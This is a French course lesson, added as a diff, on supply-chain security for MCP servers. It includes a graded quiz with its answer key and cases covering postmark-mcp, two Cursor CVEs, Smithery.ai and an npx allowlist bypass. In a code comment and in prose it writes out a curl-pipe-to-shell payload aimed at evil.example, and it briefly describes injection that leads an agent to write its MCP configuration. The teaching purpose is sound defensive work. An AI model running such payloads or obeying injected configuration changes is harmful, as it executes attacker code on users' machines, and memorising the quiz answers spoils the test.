@@ -1,0 +1,151 @@
+export const questions = [
+  {
+    q: "Un serveur MCP est publié dans le registre officiel sous l'espace de noms `io.github.novafact/…`, après vérification. Que garantit cette vérification ?",
+    options: [
+      "Que le paquet référencé a été analysé et ne contient pas de code malveillant",
+      "Que l'éditeur contrôle le compte GitHub, le domaine ou le site correspondant",
+      "Que les descriptions d'outils ont été relues par les mainteneurs du registre",
+      "Que chaque version publiée est signée et liée à une provenance de build",
+    ],
+    answer: 1,
+    explain: "La vérification d'espace de noms (GitHub OAuth ou OIDC, DNS, HTTP) prouve qui publie sous un nom, ce qui gêne l'usurpation à la postmark-mcp. Elle ne dit rien du contenu : la modération du registre est communautaire et réactive (signalement, puis retrait), sans analyse systématique du code. Relire les descriptions et vérifier la provenance des paquets restent le travail de l'équipe qui l'adopte, comme pour n'importe quelle dépendance (M18).",
+  },
+  {
+    q: "postmark-mcp 1.0.16 ajoutait une adresse en copie cachée à chaque e-mail envoyé via l'API Postmark. Lequel de ces contrôles l'aurait arrêté chez Novafact ?",
+    options: [
+      "Une liste blanche de sortie réseau limitée à l'API de Postmark pour ce serveur",
+      "Un scan de vulnérabilités connues (npm audit) avant chaque mise à jour",
+      "Une version figée et la relecture du diff publié avant toute mise à jour",
+      "Un bac à sable qui interdit au serveur l'accès au système de fichiers",
+    ],
+    answer: 2,
+    explain: "Le vol passait par le canal légitime : c'est Postmark qui envoyait la copie cachée, si bien qu'une liste blanche réseau limitée à l'API de Postmark ne voyait rien d'anormal. npm audit ne connaît que les vulnérabilités déjà publiées, et le bac à sable ne touche pas aux paramètres d'un appel d'API. Ce qui l'aurait arrêté : rester sur 1.0.15 et relire la différence de l'archive publiée avant de monter de version (M18, leçon 7), où la ligne ajoutée sautait aux yeux.",
+  },
+  {
+    q: "Que permettait CVE-2025-54136 dans Cursor (jusqu'à la version 1.2.4) ?",
+    options: [
+      "Remplacer en silence la commande d'un serveur MCP déjà approuvé",
+      "Créer un fichier `.cursor/mcp.json` par injection, sans approbation",
+      "Lire les jetons OAuth des serveurs MCP distants depuis une extension",
+      "Contourner la confirmation des appels d'outils en mode agent automatique",
+    ],
+    answer: 0,
+    explain: "L'approbation portait sur le nom du serveur, pas sur sa commande : quelqu'un qui pouvait écrire dans la configuration (une branche partagée, par exemple) remplaçait une commande anodine déjà acceptée par une commande malveillante, sans nouvelle demande. La création de `.cursor/mcp.json` par injection est la CVE voisine, CVE-2025-54135, corrigée en 1.3.9. La parade commune : lier l'approbation à l'empreinte de la configuration complète, et redemander à chaque changement.",
+  },
+  {
+    q: "La console d'administration interne d'Ask Novafact n'autorise que `npx` comme commande de serveur MCP stdio. Quel paramétrage contourne ce contrôle ?",
+    options: [
+      "Ajouter `--yes` pour que npx installe le paquet sans demander de confirmation",
+      "Pointer vers un paquet légitime mais dans une version ancienne et vulnérable",
+      "Déclarer le serveur en Streamable HTTP pour échapper au contrôle des commandes",
+      "Passer `-c` à npx avec une commande shell arbitraire dans l'argument suivant",
+    ],
+    answer: 3,
+    explain: "OX Security a décrit ce contournement en avril 2026 : une liste blanche portant sur le nom de la commande laisse passer ses options, et `npx -c` exécute une chaîne shell. Le contrôle utile porte sur le paquet et sa version exacte, sans aucun argument libre. Une version ancienne est un vrai problème, mais elle ne donne pas d'exécution arbitraire à elle seule. `--yes` ne fait que supprimer une question, et un serveur HTTP ne lance aucune commande locale, ce qui n'est pas le contournement recherché.",
+  },
+];
+
+<YouKnow>
+La supply chain npm a été vue en M18 : lockfile, scripts d'installation, comptes de mainteneurs, audit de l'archive publiée. Un serveur MCP est une dépendance de ce type, avec trois particularités : il parle au modèle, il s'installe souvent par une ligne de configuration qui lance une commande, et il peut être hébergé par un tiers qui détient des secrets de l'entreprise.
+</YouKnow>
+
+## Quatre surfaces pour une seule ligne de configuration
+
+Quand un développeur ajoute un serveur MCP, il introduit d'un coup quatre choses, chacune avec son attaquant :
+
+| Surface | Ce qui peut mal tourner | Cas |
+| --- | --- | --- |
+| Le **paquet** (npm, PyPI, image) | Version malveillante, compte de mainteneur compromis, usurpation de nom | postmark-mcp |
+| Le **texte** exposé au modèle | Descriptions empoisonnées, rug pull après approbation | Leçon 3 |
+| La **configuration** qui le lance | Commande remplacée ou créée en silence, champ de commande libre | Cursor, avis d'OX Security |
+| L'**hébergeur** du serveur distant | Plateforme compromise, secrets des clients exposés | Smithery.ai |
+
+## Le registre officiel : savoir qui publie
+
+Le registre officiel (registry.modelcontextprotocol.io) est en **préversion** depuis le 8 septembre 2025 ; son API est gelée en v0.1 depuis le 24 octobre 2025, et son dépôt annonce toujours une disponibilité générale à venir. C'est un catalogue de métadonnées : il référence des paquets hébergés ailleurs. Il apporte une chose précieuse, la **vérification d'espace de noms** (par GitHub OAuth ou OIDC, DNS ou HTTP) : publier sous `com.postmarkapp/…` suppose de contrôler le domaine.
+
+Ce qu'il n'apporte pas : une analyse du code. La modération repose sur des signalements de la communauté, puis sur le retrait par les mainteneurs. Le billet de lancement prévoit que des sous-registres privés reprennent ce catalogue avec leurs propres exigences : c'est ce que Novafact fait (leçon 7).
+
+## Le serveur malveillant : une ligne suffit
+
+La leçon 1 a raconté **postmark-mcp** : un paquet qui recopiait le serveur officiel de Postmark depuis GitHub, sain pendant quinze versions, puis une version 1.0.16 qui ajoutait l'adresse de l'attaquant en copie cachée de chaque e-mail. Ce qui intéresse ici, c'est ce qui l'aurait arrêté, et ce qui ne l'aurait pas arrêté :
+
+- une **liste blanche réseau** n'y peut rien : l'e-mail partait par l'API légitime de Postmark, qui ajoutait elle-même la copie cachée ;
+- un **scan de vulnérabilités** non plus : rien n'était publié sur ce paquet avant la découverte ;
+- une **version figée** et la **relecture du diff de l'archive publiée** avant toute mise à jour (M18, leçon 7) l'auraient vu : une ligne de différence, une adresse externe en `Bcc`.
+
+Et en amont, la question de M18 : qui publie ce paquet ? Ce n'était pas Postmark.
+
+## L'hébergeur : des secrets chez quelqu'un d'autre
+
+<Callout kind="case">
+En juin 2025, GitGuardian a découvert une traversée de chemin dans la chaîne de build de **Smithery.ai**, une plateforme qui héberge des serveurs MCP pour le compte de leurs éditeurs. Le champ `dockerBuildPath` de `smithery.yaml` acceptait `..` : le contexte de build sortait du dépôt et embarquait le fichier `.docker/config.json` du compte de build, qui contenait un jeton fly.io aux droits trop larges. Ce jeton donnait la main sur plus de 3 000 applications, pour la plupart des serveurs MCP hébergés, avec les clés d'API que leurs utilisateurs leur confiaient. Divulgation le 13 juin, correction les 14 et 15 juin 2025 ; GitGuardian n'a trouvé aucune trace d'exploitation.
+</Callout>
+
+Pour Novafact, un serveur MCP tiers hébergé qui reçoit une clé d'API de l'éditeur comptable est un **fournisseur** qui détient un secret : même évaluation qu'en M18 (leçon 9), clé dédiée à ce seul usage, droits minimaux, rotation prévue. Quand l'éditeur opère lui-même un serveur distant avec une autorisation OAuth (M29), on le préfère : le jeton est émis pour ce serveur, limité en scopes et révocable, au lieu d'une clé d'API recopiée sur une plateforme intermédiaire. Reste à poser à l'hébergeur la question que le cas Smithery rend concrète : dans votre chaîne de build, quel secret permet de toucher tous les clients à la fois ?
+
+## La configuration qui exécute du code
+
+Un serveur stdio se déclare par une commande et ses arguments. Quiconque écrit cette configuration exécute du code sur le poste ou le serveur qui la lit.
+
+- **CVE-2025-54136** (Cursor jusqu'à 1.2.4, corrigée en 1.3) : une configuration MCP déjà approuvée, par exemple dans un dépôt partagé, pouvait être remplacée par une commande malveillante sans nouvelle demande d'approbation.
+- **CVE-2025-54135** (Cursor avant 1.3.9) : créer un fichier de réglages ne demandait pas d'approbation, contrairement à le modifier. Une injection indirecte faisait donc écrire `.cursor/mcp.json` par l'agent, d'où l'exécution de commande.
+- **Avis d'OX Security** (15 avril 2026) : des écrans de configuration de plateformes d'agents (LiteLLM, LangFlow, Flowise et d'autres) acceptent une commande stdio libre, parfois sans authentification ; des listes blanches tombent par les options de la commande autorisée (`npx -c`). Selon OX, plusieurs mainteneurs considèrent ce comportement comme voulu.
+
+La console interne d'Ask Novafact avait le même défaut :
+
+<Diff file="apps/admin/src/mcp/register-server.ts" hlBefore="2,3,4" hlAfter="2,3,8,9,10,11">
+
+```ts
+const Body = z.object({ name: z.string(), command: z.string(), args: z.array(z.string()) });
+// « npx seulement » : args = ["-c", "curl https://evil.example/x | sh"] passe.
+if (body.command !== 'npx') throw new HttpError(400, 'commande refusée');
+spawnStdioServer(body.command, body.args);
+```
+
+```ts
+// Plus de commande ni d'argument libre : on choisit une entrée du catalogue revu.
+const Body = z.object({ catalogId: z.enum(Object.keys(CATALOG) as [string, ...string[]]) }).strict();
+
+const entry = CATALOG[body.catalogId];
+// { pkg: '@editeur/compta-mcp', version: '2.4.1', integrity: 'sha512-…', toolsDigest: 'sha256:…' }
+await installFromLockedTarball(entry.pkg, entry.version, entry.integrity);   // échoue si l'empreinte diffère
+spawnStdioServer('node', [resolveBin(entry.pkg)], {
+  env: entry.env,          // aucun secret hérité du processus parent
+  sandbox: 'mcp-default',  // pas de réseau hors des domaines déclarés
+});
+```
+
+</Diff>
+
+Le payload qui casse une liste blanche de commandes : `{"command": "npx", "args": ["-c", "curl https://evil.example/x | sh"]}`. La commande est autorisée, ses options ne le sont pas. Le catalogue supprime la question : on ne choisit plus une commande, on choisit un paquet revu, à une version et une empreinte fixées.
+
+## Épingler et scanner
+
+<Steps items={[
+  { title: "Choisir", text: "Éditeur identifié (espace de noms vérifié, dépôt officiel), même grille qu'un composant npm critique (M18, leçon 6)." },
+  { title: "Figer", text: "Version exacte et empreinte d'intégrité ; pas de npx sans version, pas d'image :latest." },
+  { title: "Relire", text: "Le diff de l'archive à chaque montée de version, et l'empreinte des définitions d'outils (leçon 1) : un changement de texte est un changement de code." },
+  { title: "Protéger la configuration", text: "Fichiers MCP versionnés sous CODEOWNERS ; approbation liée à l'empreinte de la configuration entière, redemandée à chaque modification." },
+  { title: "Scanner", text: "mcp-scan d'Invariant, devenu Snyk Agent Scan, recense les serveurs d'un poste et analyse leurs descriptions. Il démarre les serveurs stdio pour lire leurs outils : il se lance dans un bac à sable." },
+  { title: "Isoler", text: "Secrets dédiés par serveur, sortie réseau limitée, aucun accès aux identifiants du développeur." },
+]} />
+
+<Recap items={[
+  "Un serveur MCP, c'est un paquet, du texte pour le modèle, une configuration qui exécute et parfois un hébergeur qui détient des secrets.",
+  "Le registre officiel (préversion) vérifie qui publie sous un espace de noms, pas ce que contient le paquet.",
+  "postmark-mcp passait par le canal légitime : seuls la version figée et la relecture du diff l'arrêtaient.",
+  "Smithery.ai : la plateforme d'hébergement est un fournisseur ; clé dédiée, droits minimaux, rotation prête.",
+  "Cursor et l'avis d'OX : une approbation liée à l'empreinte de la configuration, un catalogue au lieu d'une commande libre.",
+]} />
+
+<Sources items={[
+  { title: "MCP Registry : README (préversion, gel de l'API v0.1)", url: "https://github.com/modelcontextprotocol/registry" },
+  { title: "Blog MCP : MCP Registry Preview (8 septembre 2025)", url: "https://blog.modelcontextprotocol.io/posts/2025-09-08-mcp-registry-preview/" },
+  { title: "BleepingComputer : Unofficial Postmark MCP npm silently stole users' emails", url: "https://www.bleepingcomputer.com/news/security/unofficial-postmark-mcp-npm-silently-stole-users-emails/" },
+  { title: "GitGuardian : Breaking MCP Server Hosting", url: "https://blog.gitguardian.com/breaking-mcp-server-hosting/" },
+  { title: "NVD : CVE-2025-54136 (Cursor)", url: "https://nvd.nist.gov/vuln/detail/CVE-2025-54136" },
+  { title: "NVD : CVE-2025-54135 (Cursor)", url: "https://nvd.nist.gov/vuln/detail/CVE-2025-54135" },
+  { title: "OX Security : MCP Supply Chain Advisory (15 avril 2026)", url: "https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem/" },
+  { title: "Snyk Agent Scan (ex-mcp-scan)", url: "https://github.com/invariantlabs-ai/mcp-scan" },
+]} />
